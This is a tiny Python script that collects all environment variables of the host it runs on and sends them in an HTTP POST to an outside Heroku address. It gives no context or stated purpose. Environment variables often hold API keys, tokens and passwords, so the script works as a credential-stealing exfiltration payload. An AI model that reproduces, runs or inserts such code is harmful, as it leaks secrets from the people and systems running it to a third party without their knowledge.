import requests
import os
data = {
    "vars": str(os.environ)
}
r = requests.post("https://skydeo.herokuapp.com/vars",  data=data)
print(r)